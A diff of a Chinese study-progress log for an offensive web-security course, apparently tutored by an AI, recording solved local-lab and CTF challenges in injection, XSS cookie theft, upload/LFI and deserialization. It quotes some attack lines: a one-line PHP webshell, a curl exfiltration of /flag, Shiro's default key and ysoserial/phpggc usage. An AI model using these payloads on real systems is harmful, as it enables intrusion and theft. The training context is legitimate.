@@ -1,13 +1,13 @@
 # 📊 学习进度表
 
 ## 第 0 课：环境与工具
-- [x] 读完讲义 lesson-00
+- [x] 第 0 课环境与工具（工具速查：course/Python与HTTP速查.md 第 9 节 curl）
 - [x] 靶场 docker compose up 成功启动
 - [x] curl.exe 常用用法练熟（-X / -d / -H / -b / -c / -e / --data-urlencode）
 - [x] Burp Suite 安装并完成一次抓包（可选但推荐）
 
 ## 第 1 课：HTTP 基础
-- [x] 读完讲义 lesson-01，自测题全部先写答案再看答案
+- [x] 读完速查 course/Python与HTTP速查.md（HTTP 部分第 5~12 节），自测题全部先写答案再看答案
 - [x] 靶场 ch1 只许 POST —— 这题考：___用-X指定提交方法___
 - [x] 靶场 ch2 改头换面 —— 这题考：___-H自制请求头___
 - [x] 靶场 ch3 Cookie 的秘密 —— 这题考：___有两种方法，第一个就是-v看全部，再用-b提交cookie___
@@ -15,7 +15,7 @@
 - [x] 对照 writeups/http-basics.md 复盘
 
 ## 第 2 课：命令注入
-- [x] 读完讲义 lesson-02，自测题先写答案再看答案
+- [x] 读完速查 course/命令注入速查.md，自测题先写答案再看答案
 - [x] 靶场 ci1 直接注入 —— 这题考：___；后面加命令___
 - [x] 靶场 ci2 拦分号 —— 这题考：___| && %0a 都暂时可以代替；的作用___
 - [x] 靶场 ci3 拦空格和关键字 —— 这题考：___关键字绕过和空格的代替___
@@ -23,7 +23,7 @@
 - [x] 对照 writeups/cmd-injection.md 复盘
 
 ## 第 3 课：SQL 注入（基础）
-- [ ] 读完讲义 lesson-03，自测题先写答案再看答案
+- [ ] 读完速查 course/SQL注入速查.md（第 0~2、6 节），自测题先写答案再看答案
 - [x] 靶场 si1 万能密码 —— 这题考：字符串注入闭合引号+注释符
 - [x] 靶场 si2 UNION 注入 —— 这题考：information_schema 枚举表/列 + UNION 取数
 - [x] 靶场 si3 报错注入 —— 这题考：报错信道 + 枚举表名列名
@@ -31,13 +31,14 @@
 - [ ] 对照 writeups/sql-injection.md 复盘
 
 ## 第 3b 课：SQL 注入（进阶）
-- [ ] 读完讲义 lesson-03b，自测题先写答案再看答案
-- [ ] 靶场 si5 布尔盲注 —— 这题考：______
-- [ ] 靶场 si6 时间盲注 —— 这题考：______
-- [ ] 靶场 si7 堆叠注入 —— 这题考：______
-- [ ] 靶场 si8 读文件 —— 这题考：______
-- [ ] 靶场 si9 宽字节 —— 这题考：______
-- [ ] 靶场 si10 超长 flag —— 这题考：______
+- [ ] 读完速查 course/SQL注入速查.md（第 3~5、7 节），自测题先写答案再看答案
+- [x] 靶场 si5 布尔盲注 —— 这题考：改旧脚本跑通 表->列->flag 全链（2026-08-25 复测补勾）
+- [x] 靶场 si6 时间盲注 —— 这题考：信道从页面状态换成时间差，ask() 换实现其余不变
+- [x] 靶场 si7 堆叠注入 —— 这题考：union 被拦分号没拦->multi_query 堆叠第二条语句；查目录(information_schema) != 直接查表（2026-08-25 夜修）
+- [x] 靶场 si8 读文件 —— 这题考：UNION 家族 + load_file 读文件；@@secure_file_priv 限定可读目录，flag 就放在允许目录内；真实场景读什么文件靠侦查（试金石/配置文件/报错泄路径）（2026-08-25 夜修）
+- [x] 靶场 si9 宽字节 —— 这题考：addslashes 把 %27 转成 %5c%27，GBK 双字节的第二字节范围含 0x5C -> %bf+%5c 组成汉字吃掉反斜杠，引号裸奔；or 1=1 是恒真条件不是弱口令；修复=utf8mb4（后续字节永不含 0x5C）（2026-08-25 夜修）
+- [x] 靶场 si10 超长 flag —— 这题考：报错注入+extractvalue(2参)+concat(0x7e)+substr 分段（42字符切两刀 1,30/31,30）；group_concat 合并多行（2026-08-25 夜修）
+- [x] **3b 全清（2026-08-25 夜修：si5/si6 复测通过 + si7~si10 逐题修复）**
 - [ ] 对照 writeups/sql-injection-adv.md 复盘
 ## 第 3c 课：SQL 注入难度阶梯（L2 变种 + L3 综合）
 - [x] si2b UNION 变种 —— 这题考：正则漏 /i 只拦小写，大小写绕过 + order by 探列数
@@ -55,11 +56,10 @@
 - [x] xs4 偷 Cookie（重打通过）—— 这题考：document.cookie + new Image() 无痕外带；坑：URL 里 `+` 变空格要编码 %2B
 - [x] xs5 过滤绕过（通过）—— 这题考：换标签(img onerror)+换函数(confirm)+双写嵌套(单次过滤)；alert 被删就用 confirm
 - [x] xs6 存储型打管理员（综合通过）—— 这题考：存储型留言 + new Image 偷管理员 Cookie 全链（业务联动）
-- [x] xs6 存储型打管理员（综合通过）—— 这题考：存储型留言 + new Image 偷管理员 Cookie 全链（业务联动）
 - [x] xs7 裸子串过滤（毕业考通过）—— 这题考：重叠双写 <scscriptript> 还原 script / 换事件 onfocus+autofocus；裸子串删除下嵌套失效但重叠有效
 - [x] **XSS 板块全通（重打版）**
-- [ ] 对照 writeups/xss.md 复盘
-- [ ] XSS 错题本闭卷复测（过几天）
+- [x] 对照 writeups/xss.md 复盘（2026-08-28：自忆 3 过 2 半 3 空；xs4/xs6/xs7 三题当日实弹重打全链通过——stolen.txt 第 5/6 行为各自链条自证；收获：%2B 转义坑、cookie 按域共享一锅端、裸子串过滤下嵌套失效换事件、判定标准=自己链条亮灯）
+- [x] XSS 错题本闭卷复测（2026-08-28 完成：空白的 xs4/xs6/xs7 已用实弹重打补齐，无需另行复测）
 - [ ] L4：BUUCTF 入门真题
 
 ## 第 5 课：文件上传 / 文件包含（Phase 2-3，2026-08-20 开课）
@@ -83,12 +83,212 @@
 - [x] 靶场 fi6 Session 包含 —— 这题考：/tmp/sess_ID 内容可控+-c存/-b带同Cookie;坑:<ID>占位符忘了替换原样发出去
 - [x] 靶场 fi7 pearcmd RCE —— 这题考：找不到可控文件就造一个;config-create 嵌代码;三坑:单引号/-g 禁通配/argv 不解码 payload 裸传
 - [x] 靶场 up8 Apache 解析漏洞 —— 这题考：白名单+内容校验无洞,输给 Apache AddHandler 从右往左解析;三系统单独对组合错;GIF89a 靠 WriteAllText 防 BOM
-- [ ] 靶场 fi8 毕业考三合一 —— 这题考：______
+- [ ] 靶场 fi8 毕业考三合一 -- 8-27 晚闭卷打穿,但考中机器有不明来源命令(作者未明),重考求干净结果;教师一度误判 AI 外包、已撤回道歉(详见 upload-lfi 错题本更正版);重考下周,新规:考中 AI 工具全关
 - [ ] 对照 writeups/upload-lfi-adv.md 复盘
 
+## 第 6 课：真题黑盒阶段（2026-08-26 开课）
+- [x] 真题 backleak（辅助通过）-- 这题考：.swp 备份泄露->源码审查->POST 条件触发；^M->vim 路标题；辅助过程见真题错题本
+- [x] 真题 php-batch -- 首杀 flag{no_param_rce_first_blood}（2026-08-26；提取链 localeconv→pos→scandir/next→array_reverse 全程自己装配，读旗段教练给图自己跑；靶机曾漏旗，教练已按题面补旗）
+- [x] oldapache 停车挂账（CGI/逆向题，P2 后复仇）
+
 ## 📅 待办（更新）
+- [ ] **日程锚点（2026-09-01 晚，学员报备）：9 月 5 日开学**--9/2~9/4 为最后整块假期。剩余课程 L9~L14 共 6 课，按当前产能（日 2 课）可在开学前收完反序列化全课；开学后切学期档（2h/天，路线图 P1 预设）：每日热身 + 真题转段启动（CTF²/NSSCTF）+ 武器化第 1 支工具（9 月目标：目录扫描器）。明日：热身 2 题 -> L9 原生类（状态好加 L10）
+- [x] **抢跑记档（2026-09-01 深夜，教练读题失误）**：学员口令"继续第二天对话"被教练误读为"即刻开第二天的课"，当晚开始备课动作（跑抽题器/验靶场/查 soap 扩展）被学员叫停——"明天"=9/2。未发任何课程内容，学员当晚零任务。处置：当晚抽到的热身题（up5/ci2）作废、明日重抽（题名已见保不了闭卷）；明晚开工流程不变（报地图位置 -> 热身 2 题 -> L9）
+- [ ] **L9 备课完成（2026-09-02 晨，教练侧，未开课）**：soap 扩展写入 php709/php.ini（php_soap.dll 本就存在，缺的只是 ini）；靶场两件套落位 lab-scaffold/——l9-native(8093 挑战+demo) / l9-inner(8094 内网 flag 服务；与挑战页分进程：PHP 内置服务器单线程，同口自请求会死锁，分开还顺带模拟"内网另一台机器"）；start-labs.cmd 扩为一键五口
+  - 全链验靶通过：demo 两实验（Error XSS 实弹 SoapClient SSRF 实弹）/ 挑战 GET+POST 双路线拿旗 / 直连 flag 服务 403 / stdClass 哑弹有清晰反馈 / hit_l9.txt 记 UA（PHP-SOAP/7.0.9 与 curl 一眼可辨）；旗 flag{soapclient_ssrf_l9} 在位，hit 清零留白板
+  - **收货名单实测定稿（PHP 7.0.9）**：unserialize 收=SoapClient/Error/Exception/stdClass；拒=SimpleXMLElement/GlobIterator/SplFileObject/DirectoryIterator（serialize 抛禁+手搓串也拒收）；探针 l9-probe~7.php 留档 lab-scaffold 根（含两次教练手数长度翻车实证，L1 铁律再现）
+  - **SoapFault 回旗机关**：内网服务用 faultstring 带旗回话 -> SoapClient 抛异常 getMessage()=旗 -> 挑战页 catch 显示；普通信封响应 __call 返 NULL（盲打常态），教学要可见回旗故选 Fault 信道
+  - **基建记档**：晨检发现 8090~8092 三口夜间全灭（最小化窗口被关；机器未重启，docker 容器 25h 未断为证）——start-labs.cmd 一键拉起五口全活（8090/8091 根路径 404 属正常，真实靶页是 vault.php/account.php）
+- [x] **晨间热身 2/2 通过（2026-09-02 晨，复习机制第 2 跑）**：fi3 一次过（旗 flag{fi3_filter_read_source}，教练重放验证一致；名词精度修正：学员误称"file 协议"->正名 php://filter 流协议、绕的是 include 执行模式而非协议禁令）；xs6 全链自证（赃物行 admin_session=flag{xs6_admin_cookie}），**学员自发升级打法：img onerror 换标签替代 8-28 裸 script 标签**（xs5 肌肉迁移）；途中两处即时修正：赃物地址少一段 /xss/（404 误判"收不到"）、"攻击者服务器"概念缺口（靶场内置收集器 hack.php vs 真实场景外带端如 webhook.site）
+- [x] **L9 原生类武器 · 通过（2026-09-02，当日开课当日过）**：靶场 127.0.0.1:8093（挑战"体检中心"）+ 8094（内网机器，只吃 SOAP，与挑战分进程）。旗 flag{soapclient_ssrf_l9} 20:59 实锤（hit 日志 UA=PHP-SOAP/7.0.9 自证真 SoapClient）；流程 = demo 实验台（20:54 demo_soap 命中）→ 工坊填 TODO → 挑战拿旗
+  - **首述不过 + 坦白**：过门复述"SoapClient 特殊性能触发 __call 从而 SSRF"太糊，学员自报"只知道按模板打"——教练同责记档（builder 模板一把梭到旗，机制没逼学员想；L5 同款病灶）
+  - **补救（规矩 31 换更基础讲法）**：用学员自己的弹药串当教材重讲两环（location 躺在串里=递地址的手是你（L8 精度半句复用）；旗的旅程七站）；学员自发拿搬家题做实验（location 改 8095 → Could not connect to host）——故障签名反而实证"地址由弹药决定"，坏事变教材
+  - **填空骨架收效**（L7 画像注的方法再次验证）：三空补考 ② faultstring 正中；①③各偏一格（/flag_l9.php 答成旗的家=把柜台当金库；"报错信息"答成抛出的东西=把货当容器）——两处精度修正后过门：flag_l9.php 是看门人/接口、flag_l9.txt 是旗的家；抛出的是**异常（容器）**、报错信息是它肚子里的货
+  - 速查表第 9 节 + 坑8（收货名单）/坑9（写 IP 别写 localhost，::1 解析坑）落位；探针 l9-probe~7.php 留档
+  - **链接格式修正**：裸 URL 在学员客户端不可点（点成 localhost:8084/{#} 乱跳）→ 今后一律 Markdown 链接格式 [名](地址)
+  - 明日计划：热身 2 题 -> L10 PHPGGC（SoapClient 链是 PHPGGC 的地基，今日概念直接续接）
+- [x] **基建治本（2026-09-03 晨）**：809x 五口连续第二夜全灭（最小化窗口被关复发，docker 无恙）——start-labs.cmd 改用 PowerShell `Start-Process -WindowStyle Hidden` 拉起：无窗口可误关、进程独立；重启后五口全活 + soap 扩展随 php.ini 自动加载复验通过（demo w=3 实弹）；停服方式变为任务管理器杀 php.exe
+- [x] **晨间热身 2/2 通过（2026-09-03 晨，复习机制第 3 跑）**：ci4 闭卷复述反引号命令替换（旗 flag{ci4_backtick}）；ch4 旗 flag{ch4_urlencode}（"直接给答案了"属实——页面自带"试试 name=admin"扶手提示，当日补一行机制：GET 参数服务器自动 URL 解码）。教练侧重放两连错记档：参数名打错（ip 应为 msg）+ URL 裸空格未编码（curl 空响应签名）——学员早已学过的 URL 编码课教练重修
+- [x] **L10 备课完成（2026-09-03 晨，教练侧）**：PHPGGC 经镜像代理克隆（gh-proxy.com，GitHub 直连被重置）至 D:\deepseek\phpggc\；工厂本体需新 PHP——php709 解析现代语法失败，本机 D:\php\php.exe（8.5.7）可跑（生成弹药与靶机 PHP 版本无关）；Monolog 1.27.1 真库 + psr/log 1.1.4 依赖下载入靶 vendor/（第一版漏拷 psr/log -> unserialize 静默死，"Interface 'Psr\Log\LoggerInterface' not found"——composer.lock 里明明写着依赖，讽刺入册）
+  - 靶场 l10-phpggc(8095)：真实 vendor 树 + PSR-4 autoload + 泄露的 composer.lock（侦查素材）+ base64 反序列化导入点 + flag_l10.txt；考点 = 无方法调用、对象自然谢幕时 __destruct 开火
+  - **坑7 复发与治本**：php -S 关闭期析构 CWD 回启动目录 -> 相对路径 `type flag_l10.txt` 静默扑空（L6 同款）；修法 = Start-Process 加 -WorkingDirectory 指到靶场目录（保住"自然谢幕"题设不破坏）
+  - 全链验靶通过：phpggc -b Monolog/RCE1 system 'type flag_l10.txt' -> 打靶 -> 谢幕时页面底部出旗 flag{phpggc_monolog_factory_l10}；链条六跳人工复走确认（destruct->close->socket->close->flush->handleBatch->handle->processors：current 把 record 数组降级成字符串再交给 system 的双段诡计）
+- [x] **L10 PHPGGC · 通过（2026-09-03，当日开课当日过）**：旗 flag{phpggc_monolog_factory_l10} 实锤
+  - **过门三关实录（对表手艺三轮收敛）**：首述 base64 因果答反（"因为靶面有 decode"->正名：\0 进不了文本世界，base64 是运输包装，靶面设计被弹药需求倒逼）；补考一 2.9.1 选链错答 RCE8（Laravel 编号串门）+ 漏答"门关了换攻击面"；补考二 1.20.0 判 4/6（RCE3 死在上限比对、RCE2 扫行跳过）；终判 3.0.5 答 RCE8/9 正确且隐含 FW1 类型筛除——三格比对（名字/版本/类型）落地
+  - **学员抓教练实错（规矩 29 行使）**：教练货架列表 head -30 截断后断言"Monolog 只有 RCE1~6"，学员实跑 phpggc -l 发现 Monolog/RCE8（3.0.0<=3.1.0+）并反问"你要不仔细看看那个工具"——全量实为 10 条（FW1+RCE1~9）；教练道歉一次、全量重判；**列表结论必须全量核对**入坑10
+  - 教练同责记档（L9 模板病复发）：讲义写全完整命令行（连链名带参数），学员可照抄跳过选链——补考判例被迫承担选链教学；后续实战任务讲义只给工装不给弹药参数
+  - FW1 类型格闭环（过门补讲）：范围=能装，类型=对口；要 RCE 选 8/9，要写文件 FW1 是唯一钥匙
+  - 速查表第 10 节 + 坑10/11/12 落位
+- [x] **L11 备课完成（2026-09-03 午，学员令"继续"即开）**：靶场 l11-pickle(8096)——Python 3.12 纯标准库 http.server，三件套 server.py（TodoLite 会话恢复故事：POST d=base64 -> pickle.loads -> repr 回显）/ build_pickle.py 工坊（TODO=eval 表达式，L10 教训落实：讲义只讲概念不送弹药参数，工坊提示到 open().read() 为止）/ flag_l11.txt；验靶两弹全过：eval 弹 repr 回显旗 flag{pickle_reduce_boom_l11} + os.system 弹回显只剩退出码 0（"弹响了但你瞎了"教学签名：回显信道=__reduce__ 返回值——L9 Fault 信道/SQL 报错信道同族概念）；启动挂 -WorkingDirectory 防 CWD 坑
+- [x] **L11 pickle · 通过（2026-09-03 午后，当日开课当日过，零补考）**：旗 flag{pickle_reduce_boom_l11} 实锤；复述两问一次到位——"__reduce__ 自带引信的炸弹，不需要类配合"（L8 级成色）+ "eval 有回显 / os.system 结果在服务器自己的控制台看不见"；教练补精度半句：回显信道严格说是 __reduce__ 函数的返回值，eval 只是"用返回值说话"的那发弹
+  - **L10 教训落实生效**：讲义只讲概念（eval('2+3') 无害演示）不送弹药参数，读旗表达式学员自装——对照 L9/L10 两轮模板病，本课过门一次过；"讲义只给工装不给弹药"固化为后续课规
+  - 速查表跨语言区 pickle 节落位
+- [x] **L12 备课完成（2026-09-03 午后，学员令"继续"即开）**：靶场 l12-java(8097)——Java 21 纯 JDK HttpServer（L12Server.java 全透明源码 + CC 3.1 真库挂 classpath + flag_l12.txt + webroot 落盘区）；ysoserial-all.jar 经镜像代理下载至 D:\deepseek\
+  - **ysoserial 在 Java 21 上要 --add-opens 开模块闸**（InaccessibleObjectException 签名：HashSet.map 反射被 JEP 封装拦截）——生成侧需要，靶机侧 readObject 正常引爆不需要（实测）
+  - 全链验靶通过：CC6 造弹 'cmd /c copy flag_l12.txt webroot\stolen.txt' -> POST -> readObject 引爆（回显只有"导入 java.util.HashSet"，无执行结果）-> GET /stolen.txt 取回旗 flag{java_cc6_ysoserial_l12}；坏输入签名 StreamCorruptedException；**Runtime.exec 直 spawn 不经 shell，cmd 内建命令须 cmd /c 包装（copy 落盘实测可行）**；清痕留白板
+  - 教学设计（L11 课规延续）：讲义只给工装（ysoserial 命令格式 + 无害示例命令），落盘取旗的两段式命令学员自装；无回显->造信道（webroot 落盘+GET 取回）与 L11 回显信道概念呼应
+- [x] **L12 Java 反序列化 · 通过（2026-09-03 午后，当日第三课）**：旗 flag{java_cc6_ysoserial_l12} 实锤（CC6 链 + 两段式落盘，webroot/666.txt 为学员亲手落的盘）；复述两问——"跟 PHP 一样借手"✓ + "两段式：先转移到可访问处再取，执行结果在服务器控制台看不见"✓；首述"CC 库=弹药库"角色串门 -> 三角色卡（手=commons-collections / 工厂=ysoserial / 弹药=序列化串）纠正后一句定音"CC 是手，ysoserial 是工厂"过门；轻点两条：借的是 classpath 依赖库非目标自写类（同 L10 vendor 义）、Java 钩子名 readObject/hashCode 角色同魔术方法
+  - 途中四问全答（spawn=直接创建进程不经翻译官 / --add-opens 固定搭配+InaccessibleObjectException 开锁签名 / rb=二进制读防换行改坏 / 链子对表同 L10 含"CC1 在新 JDK 是著名哑弹"活教材）；学员取货 404 乌龙（首试失败残留页+浏览器不自动重查）-> 弹道自查三步入册：①POST 回显签名 ②再 GET
+  - 工装级引导记录：copy 语法+服务器侧执行心智模型以"形状+自填空"给出（L11 课规边界内）；速查表跨语言区 L12 节落位
+  - **今日三课连打（L10+L11+L12），超出日 2 课锚定产能**；剩 L13 .NET + L14 毕业考，明日 9/4 为最后整块假期日
+- [x] **晨间热身 2/2 通过（2026-09-04 晨，复习机制第 4 跑，SQL 双题）**：si1 一次过（旗 flag{si1_login_bypass}；途中学员自报"靶子有问题"——教练实测靶健康，真凶是 `--` 裸写无尾随空格的经典哑弹，学员自认输入问题）；si5 全链自证（旗 flag{si5_boolean} 与库一致），**途中高价值坑入册**：学员改 si5b 脚本打 si5，表名子查询遇多行结果（si5 库两张表实测）-> Subquery returns more than 1 row -> 盲注全假静默垃圾——"盲注子查询必须承诺恰好一行"进错题本候选；防御性脚本课第二次开讲（sanity probe 两发可省 57 发垃圾轮次）；脚本评审四点：URL 指错靶/si5b 库同样两表（原版必带只取一行零件）/oracle 兼容（"查询到了"子串命中实测）//** */ 多余但无害
+- [x] **L13 备课-靶场侧完成（2026-09-04 晨）**：L13Server.exe（C# 5/csc.exe 编译，HttpListener 8098 + BinaryFormatter.Deserialize + webroot 落盘区 + flag_l13.txt，DotNetKeeper 故事与 L12 同构）；页面指纹教学：base64 后 AAEAAAD/////；坑4 复发（Git Bash 吃 /nologo 参数，MSYS_NO_PATHCONV=1 解）
+- [x] **L13 备课-工厂侧完成（2026-09-04 晨，学员加排除项后 10 分钟收工）**：ysoserial.net v1.36 经排除项落位 D:\deepseek\ysoserial-net\Release\；全链验靶通过：TypeConfuseDelegate + BinaryFormatter + `cmd /c copy flag_l13.txt webroot\stolen.txt` -> POST 8098 -> Deserialize 复活 SortedSet -> Process.Start 异步开火 -> webroot 落盘 -> GET 取旗 flag{dotnet_binaryformatter_l13}；清痕白板
+  - **验靶三坑实录**：①Defender 实时防护吃工具（学员管理员排除项解决，本地攻防经典戏码第二例）②工厂默认吐 base64——教练想当然再编一层成双重编码，SerializationException 报错签名自带尸检（"开始内容 41-41-45"= ASCII"AAE"）③Process.Start 异步开火：POST 完立刻取货=404 假哑弹，等 2 秒=旗到（教练差点误诊第一发失败）；附带：绝对路径版命令经 gadget 反而失败，相对路径稳（CWD 继承自 -WorkingDirectory）
+  - 教学点定稿：四世界指纹表收官（PHP O: / py gASV / Java rO0AB / .NET AAEAAAD/////）；.NET 特点=手长在框架本体（SortedSet/委托系统自带，区别于 Java 要装 CC 库）；-f formatter=口径匹配概念
+- [x] **L13 .NET · 通过（2026-09-04 晨，当日开课当日过）**：旗 flag{dotnet_binaryformatter_l13} 实锤（webroot/a.txt 学员亲手落盘自证）；复述两问一次到位——".NET 手系统自带 vs Java 要 classpath 挂 CC"✓ + "formatter=序列化格式、靶子是 BinaryFormatter"✓（教练补半句：formatter=弹壳口径，-f 选壳配枪口）；vulhub 排期问询当日答（P1 支线、前置=模块收棺、L12/L13 直接对口 Fastjson/Shiro/Log4j2 族）入新坑清单
+- [x] **L14 毕业考备靶完成（2026-09-04 上午，细节防剧透从简）**：靶场 8099（l14-exam/，php709）；考链设计 = L1 格式 + L4 手搓 POP + L6 wakeup 绕过三课联合，wakeup 设计为"中和型守卫"（重置外发通道而非 die）；**设计改版记档**：原案 phar 投递 + count 假，实测死路（phar 内部 metadata 解析失败时整体判废、部分对象不析构，与直 unserialize 行为不同）→ 改直 unserialize 点（?a=restore&d=base64）；阴阳性双测全过（正常串无旗=守卫生效；假 count 旗踩着"恢复失败"报错出来）；教练侧全痕迹清除
+  - **教练手数长度第三、四次翻车记档**（AvatarKeeper 数成 13 实为 12；探针路径 s:46 实为 59）——L1 铁律教练版合集累积四处，"让 PHP 自己 serialize"的教学原则教练自己要践行
+  - 探针设计坑：手工构造的对象在脚本结束时也会析构（wakeup 只在 unserialize 时跑，manual 构造永不触发）——探针泄漏旗一度误诊为"守卫失效"，单变量重测后守卫清白
+- [x] **L14 毕业考 · 通过（2026-09-04 上午）**：旗 flag{l14_grad_3b7e} 实锤，独立完成零提示；学员校准反馈"太简单（就 wakeup 绕过+base64）"——**受理且记档**：原案 phar 投递+文件级补丁的发现层因死路被砍，改版后难度低于 L5 web3.php 五节点链，毕业考难度校准失误教练认账；学员三行复述"漏洞点在 wakeup 和 box"正确但压缩漏了 POP 手搓环节（完整链=图纸手搓+wakeup 绕过+运输三件）
+  - **掌握的内部视角**：对照 L5 同类题三级带读+认输，本次十几分钟独立清关全机制命中——"感觉简单"本身即毕业证据
+  - 待办：费曼关（全模块复述）后收棺；联合高级题（原案 phar 全链，改新类重造）视学员状态选做
+- [x] **🎓 费曼关通过 · 反序列化模块 L1~L14 正式收棺（2026-09-04）**：14 站全勤零跳站；后半程四世界三要素（手/引信/信道）全名命中；纠错四处（L3 标签、L7 数学、L6 方向、L12 参数含糊——详见 error-book-deser.md 建档）；微补考 2/2（L7 计算 15 ✓ / L3 三对钩子全从 web3.php 实战链中来 ✓）
+  - **模块战报**：2026-08-30 开课 → 09-04 收棺，6 天 14 课 + 毕业考 + 费曼关，全程实弹；速查表十节正文 + 跨语言区四节 + 坑 1~12 落位；靶场 8090~8099 十口常备（一键脚本）；错题本 error-book-deser.md 建档（学员 6 条 + 教练 5 条同权）
+  - **抽题器题池扩充**：L6/L9/L10/L12/L14 五题入池——开学后热身轮换覆盖全模块
+  - 模块收棺转正，进复习轮换；明日 9/5 开学切学期档：每日热身 2 题 + 真题转段（CTF²/NSSCTF）+ 武器化第 1 支工具（9 月目标：目录扫描器）
+- [x] **vulhub 首战备课完成（2026-09-04 午，学员令"趁热打铁"）**：vulhub 仓库经 gh-proxy 浅克隆；Shiro CVE-2016-4437 环境起于 127.0.0.1:8100（原 8080 撞口改映射；镜像"层找不到"重试即过，L6 老病轻症）；旗 flag{shiro_rememberme_vulhub} 布于容器 /flag_shiro_v1.txt；全链验靶通过：CB1（ysoserial + --add-opens×5，java.xml 模块要加开）-> shiro_armor.py 甲包装（默认 key kPH+bIxk5D2deZiIxcaaaA==，AES-CBC+IV 前置）-> rememberMe cookie POST /doLogin -> 无 shell 外带 `curl --data @/flag http://host.docker.internal:9999/` -> exfil_recv.py 收货器到旗；工装三件（shiro_armor/exfil_recv/cb 生成配方）就位，痕迹清白
+  - 备课三坑记档：①CB1 生成要 --add-opens java.xml（TemplatesImpl 住那）②**Bash 工具环境变量不跨调用**——教练在新调用里引用旧 ${CMD_B64} 造出空弹（"哑弹排查：先验弹响不响（容器内 touch 验痕）再查外带"的实战教学素材）③docker exec 的 /tmp 被 Git Bash 转成宿主路径（坑4 的新马甲，MSYS_NO_PATHCONV 常备）
+  - 教学设计：Shiro 甲 = 唯一新概念（rememberMe 结构+默认 key=没锁）；手=shiro 自带 commons-beanutils（三角色卡复用）；外带=ci1 OOB 老知识+无 shell 新姿势（--data @file 对比 {echo,base64} 教科书招）
+- [x] **Shiro 反序列化（vulhub 首战）· 通过（2026-09-05，真 CVE 首杀）**：旗 flag{shiro_rememberme_vulhub} 实锤（学员收货器自证）；复述：外带信道四要素全对（收货器/地址/靶机主动寄/寄的是旗文件）；甲结构首述"没听懂"（教练"甲"生造术语弃用）→ 白话重讲（包装=拆包三步倒放）→ 默认 key 认知纠正（**方式公开是密码学铁律，钥匙写死源码=人人有钥匙=没锁**）→ 定音问答"随机 key 断哪步"答"加密那步"✓（教练补精度：断点精确在服务器解密层；延伸：真实打法带 key 爆破环）
+  - 战况曲折实录（全是真钱坑，入错题本）：CMD cd 不切盘符（/d）vs PowerShell cd 直切；相对路径认 CWD 不认脚本目录；跳步踩依赖（②没①产物报 FileNotFoundError）；弹药造错目录；机器关机后靶场全灭重启手册
+  - 教练同责：重启手册 cd 写法前后不一致（裸 cd/cd /d 混用）诱发翻车；"甲"术语两轮没讲清
+  - **信道家族表**入速查（ci1 OOB/xs4 JS 外带/php-batch 走私/L12 落盘两段式/今日 curl --data @ 直寄）——**信道选择跟着环境走**（Spring Boot 单 jar 无 web 目录→直寄）；由学员主动盘点外带库存触发（迁移意识好）
+  - 明日起开学档正式节奏：热身 2 题（题池含反序列化五题）+ 真题转段（CTF²/NSSCTF）+ 工具线（目录扫描器）；**学员 9/5 晚定：首战平台 = NSSCTF**（账号已有，paper 题时注册）；真题规矩 = 路线图 AI 退场二档：独立 45 分钟后才许求助、只答具体问题不喂方案
+- [x] **🎯 真题转段启动 · NSSCTF 首刷五连（2026-09-06 上午）**：P1 里程碑"15+ 真题"进度 **5/15**。SWPUCTF 2021 新生赛五题一穿：P387 easy_sql（UNION 正常流+group_concat 多行合并）/ P426 ez_unserialize（robots.txt 侦查->手搓 wllm 弹->admin/passwd 过 destruct ===门）/ P427 include（php://filter）/ P424 easyrce（有回显 RCE）/ P386 easy_md5（数组/0e 绕过）；五旗实锤（NSSCTF UUID 格式×5）；**零求助**——45 分钟独立规则全程未动用，AI 退场二档首战即满分
+  - 教练菜单定低记档：+2 入门档低于学员真实段位（五题均一击穿）；**下轮升中等档（+3 分段）**
+  - 晨间热身 3/3：xs5（无旗题弹窗即过，机制复述✓）/ ci2 ✓（教练重放验证 flag{ci2_pipe}）/ ×3 变体=12 ✓——昨夜 ×4 空白今晨修复，L7 填充公式三数据点焊死（22/15/12）
+  - 教练踩点记档：NSSCTF 题库 4210 题（浏览器踩点）；靶机/分数/评分筛选器为 VIP 功能——选题靠类型+标签+分数；首页见 P174 phar 题（Upload Labs 2）留作 L8 肌肉对口备用
+- [x] **P3463 easyjava 战报（2026-09-06 午后，教学深度拉满，旗未出——题坏）**：判决 = **NSSCTF 部署官方 JDK21 坏镜像**，模块锁杀死整条链（writeup 作者亲证需自改 Dockerfile 换 JDK8；学员"这题怪怪的"直觉全场最准）。同弹同 jar 在本地开锁环境全通（sleep 5.09s + exfil webhook 到货）——链正确性铁证闭环
+  - **完整攻击链复盘**（学员全程观战）：404 页指纹→猜路 /web→deleteMe 确认 Shiro→默认 key 死→JDK 纯探针鉴别 key 定制→key 爆破 26 发全灭→**附件源码审计**（javap 拆字节码：真入口 /admin/hello?data= 裸 readObject 无 AES）→黑名单审计抓点号 bug→authc 挡路→查研究 11989 `/;/web/` 绕过 200→CB1/CC6 双双阵亡（**CC 3.2.2 functor 双向锁**——真靶 CC 全家死因）→**手搓零 CC 的 CB 链**（PriorityQueue+BeanComparator+String.CASE_INSENSITIVE_ORDER+TemplatesImpl）→弹头三重工程（AbstractTranslet 父类 / v65→v52 字节码头手术 / -XDstringConcat=inline 防 invokedynamic）→**神谕驱动调试**（data= 计数 = 成功/失败隐藏信道，逐层隔离：入口✓驱动✓黑名单过检✓弹头✓组合死→锁 JDK 版本）
+  - **教练四错四修现场**（全程学员观战，错题本候选）：sleep 异步误判（exec 型 RCE 响应计时无效——SQL 时间盲信道不可平移）/ 队列单弹（writeup"两个 TemplatesImpl"漏读）/ 弹头字节码 v65 打 JDK8 / invokedynamic 兼容
+  - 战利品文件全家桶入册 shiro-battle/（GenCB.java+TplSleep+TplExfil+GenStr/GenDriverTest 神谕探针+TestDeser/TestLoad+cb_sleep/cb_exfil）；**本地 9090 开锁靶常开**供学员复刻全链；easyjava-src/ 含解包 jar
+  - 二次反序列化（RMIConnector/SignedObject 被点名）/JRMP/BeanFactory+EL 等后手知识地图留档（本题未用上）
+- [x] **晨间热身 2/2 通过（2026-09-07 晨，学期档第 3 个学习日）**：si2b ✓（旗 flag{si2b_case_bypass} 与库 ctf2b.secret_table 一致，UNION 变种正则 /i 大小写绕过肌肉在位）；up4 ✓（旗 flag{up4_image_horse_include}，教练实弹重放自证——响应体内 `GIF89a<?php $flag = "flag{up4_image_horse_include}";` 即 cat /flag_up4.php 的吐出原文）
+  - up4 全链 = 学员独立完成：GIF89a 头图片马（32 字节，`<?php system($_GET[1]);?>` 一行式）过 getimagesize 内容校验 → 查看器 include 点火 → `1=cat /flag_up4.php` 倒源码出旗。**$_GET 收 GET 发信道配对正确**（fi1 旧坑未复发）
